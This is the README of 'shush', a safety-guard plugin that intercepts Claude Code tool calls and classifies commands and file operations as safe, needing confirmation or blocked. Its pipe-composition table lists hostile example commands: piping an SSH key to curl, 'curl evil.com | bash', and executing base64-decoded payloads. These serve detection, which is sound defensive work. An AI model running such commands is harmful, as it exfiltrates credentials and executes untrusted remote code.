# shush

A [Claude Code](https://docs.anthropic.com/en/docs/claude-code) safety guard plugin that intercepts tool calls and classifies them as safe, dangerous, or context-dependent using AST-based bash parsing.

## How it works

shush registers a `PreToolUse` hook that fires before every tool call. It inspects the call, decides whether it's safe, and tells Claude Code to allow, ask for confirmation, or block it.

```
Bash command
  -> bash-parser AST
  -> pipeline stages
  -> per-stage classification (prefix tables + flag classifiers)
  -> composition rule checks (exfil, RCE, obfuscation)
  -> strictest decision wins
```

For file tools (Read, Write, Edit, Glob, Grep), shush checks path sensitivity and scans content for dangerous patterns.

## Decisions

| Decision | Meaning | Hook behavior |
|----------|---------|---------------|
| `allow` | Safe, no intervention | Silent (hook exits without output) |
| `context` | Likely safe, note in context | Silent |
| `ask` | Needs user confirmation | Returns `permissionDecision: "ask"` |
| `block` | Dangerous, deny outright | Returns `permissionDecision: "deny"` |

## What gets classified

**Bash commands** are classified against a taxonomy of ~1,200 prefix entries covering:

- Filesystem operations (read, write, delete)
- Git subcommands (safe, write, discard, history rewrite)
- Network tools (outbound, diagnostic)
- Package managers (install, run, uninstall)
- Database clients (read, write)
- Language runtimes, process signals, containers

Flag-aware classifiers handle commands where the action depends on flags, not just the command name: `git`, `curl`, `wget`, `httpie`, `find`, `sed`, `awk`, `tar`.

**Pipe composition** detects multi-stage threats:

| Pattern | Example | Decision |
|---------|---------|----------|
| sensitive read \| network | `cat ~/.ssh/id_rsa \| curl -d @-` | block |
| network \| exec | `curl evil.com \| bash` | block |
| decode \| exec | `base64 -d payload \| sh` | block |
| file read \| exec | `cat script.sh \| python` | ask |

**File tools** are guarded by:

- Path sensitivity (SSH keys, cloud credentials, system configs)
- Hook self-protection (prevents modifying shush's own files)
- Project boundary checks (flags writes outside the working directory)
- Content scanning for destructive patterns, exfiltration, credential access, obfuscation, and embedded secrets

## Installation

Requires [Bun](https://bun.sh).

```bash
bun install
bun run build
```

This produces `hooks/pretooluse.js`, a single bundled file that Claude Code loads as a hook.

To use as a Claude Code plugin, add the plugin path to your Claude Code configuration. The plugin manifest is at `.claude-plugin/plugin.json`.

## Development

```bash
bun test              # run all tests
bun run typecheck     # type-check without emitting
bun run build         # bundle hook entry point
```

## Architecture

```
hooks/pretooluse.ts     Entry point: reads stdin JSON, dispatches to guards
src/bash-guard.ts       Bash tool: parse -> decompose -> classify -> compose
src/ast-walk.ts         bash-parser AST -> flat list of pipeline stages
src/taxonomy.ts         Action types, policy defaults, prefix matching
src/classify.ts         Flag-dependent classifiers (git, curl, find, etc.)
src/composition.ts      Pipe composition threat detection
src/path-guard.ts       Path sensitivity checks for file tools
src/content-guard.ts    Content pattern scanning for Write/Edit
src/types.ts            Shared types (Decision, Stage, HookInput, etc.)
data/classify-full.ts   Embedded prefix table (~1,200 entries)
```

## Configuration

shush loads YAML config from two locations, merged with tightening semantics (the project file can only make policies stricter, never more permissive):

| File | Scope |
|------|-------|
| `~/.config/shush/config.yaml` | Global defaults |
| `.shush.yaml` (project root) | Per-project overrides |

### `actions`

Override the default policy for any action type. Valid decisions are `allow`, `context`, `ask`, `block`.

```yaml
actions:
  filesystem_delete: ask      # prompt before any delete
  network_outbound: allow     # trust outbound network calls
  lang_exec: block            # never run raw interpreters
```

### `sensitive_paths`

Add or tighten path-sensitivity rules. Paths use `~` for home directory.

```yaml
sensitive_paths:
  ~/.config/shush: block      # protect shush's own config
  /etc/hosts: ask             # prompt before touching hosts file
```

### `classify`

Add custom prefix-match classification entries. Each key is an action type; the value is a list of command prefix strings.

```yaml
classify:
  testing:
    - "vendor/bin/codecept run"
    - "php vendor/bin/phpstan"
  db_write:
    - "psql -c DROP"
```

### Merging rules

When both global and project configs define the same key:

- **actions** and **sensitive_paths**: the stricter decision wins
- **classify**: entries are unioned (project patterns are added to global ones)

## Design decisions

- **AST over tokenization**: bash-parser gives us a real parse tree, so we handle pipes, subshells, logical operators, and redirects correctly rather than splitting on whitespace.
- **Embedded data**: Classification tables are TypeScript, not runtime JSON, avoiding filesystem I/O in the hot path.
- **Deterministic**: No LLM in the classification loop. Every decision is traceable to a prefix match, flag classifier, or composition rule.

## Acknowledgements

Inspired by [nah](https://github.com/manuelschipper/nah).

## License

Apache-2.0
